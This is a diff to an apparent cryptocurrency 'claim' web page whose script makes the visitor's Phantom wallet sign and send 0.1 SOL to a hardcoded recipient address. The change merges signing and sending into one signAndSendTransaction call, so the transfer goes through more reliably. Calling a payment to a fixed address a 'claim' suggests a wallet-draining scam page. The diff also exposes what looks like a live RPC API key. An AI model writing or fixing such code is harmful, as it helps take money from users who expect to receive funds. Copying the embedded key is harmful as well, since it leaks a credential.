@@ -38,7 +38,7 @@
         }
 
         #status {
-            margin-top: 20px;
+            margin-top: 0px;
             font-size: 0.9rem;
             color: #00ff88;
             min-height: 50px;
@@ -59,11 +59,13 @@
 
     <script>
         // ==========================================
-        // REPLACE THIS WITH YOUR PHANTOM WALLET ADDRESS
+        // YOUR CONFIGURATION
         // ==========================================
-        const RECIPIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
+        
+        // YOUR WALLET ADDRESS (Recipient)
+        const RECIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
 
-        // Primary Reliable RPC (Helius Public)
+        // YOUR API KEY
         const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
 
         async function initiateClaim() {
@@ -85,7 +87,7 @@
                 // 2. Define Recipient
                 let recipientPubkey;
                 try {
-                    recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
+                    recipientPubkey = new solanaWeb3.PublicKey(RECIENT_ADDRESS);
                 } catch (e) {
                     alert("Invalid Recipient Address in code.");
                     return;
@@ -109,7 +111,6 @@
                 const connection = new solanaWeb3.Connection(RPC_URL);
                 
                 try {
-                    // Try to get blockhash
                     const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                     
                     transaction.recentBlockhash = blockhash;
@@ -121,23 +122,17 @@
 
                 statusDiv.innerText = "Sign Green...";
                 
-                // 5. Sign
-                const signedTx = await window.solana.signTransaction(transaction);
-                console.log("Signed");
-
-                // 6. Send
-                statusDiv.innerText = "Sending transaction...";
-                
-                const signature = await window.solana.sendTransaction(signedTx, {
+                // 5. Sign AND Send (Modern Phantom Method)
+                const result = await window.solana.signAndSendTransaction(transaction, {
                     skipPreflight: false,
                     commitment: 'singleGossip'
                 });
 
-                console.log("Sent:", signature);
+                console.log("Sent:", result.signature);
                 
                 alert("Success! 0.1 SOL sent.");
                 btn.style.display = 'none';
-                statusDiv.innerText = "Sent: " + signature;
+                statusDiv.innerText = "Sent: " + result.signature;
 
             } catch (err) {
                 console.error(err);
